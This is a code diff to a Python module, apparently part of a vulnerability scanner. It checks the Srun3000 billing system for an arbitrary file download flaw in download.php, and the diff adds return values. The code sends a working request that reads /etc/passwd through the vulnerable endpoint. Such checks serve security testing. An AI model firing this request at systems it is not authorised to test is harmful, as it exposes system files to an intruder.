@@ -25,15 +25,20 @@ class srun_download_file_filedownload_BaseVerify:
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"hostname" in req.text and r"clientver" in req.text:
                 cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "深澜软件srun3000计费系统download.php任意文件下载", str(payload), req.text
             vulnurl = self.url + "/download.php?k=5a965488ed38055590daf62ddd52dbb3&file=/etc/passwd"
             req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
             if r"root:" in req.text and r"/bin/bash" in req.text:
                 cprint("[+]存在深澜软件srun3000计费系统download.php任意文件下载漏洞...(高危)\tpayload: "+vulnurl, "red")
+                return True, vulnurl, "深澜软件srun3000计费系统download.php任意文件下载", str(payload), req.text
+
             else:
                 cprint("[-]不存在srun_download_file_filedownload漏洞", "white", "on_grey")
+                return False, None, None, None, None
 
         except:
             cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
+            return False, None, None, None, None
 
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
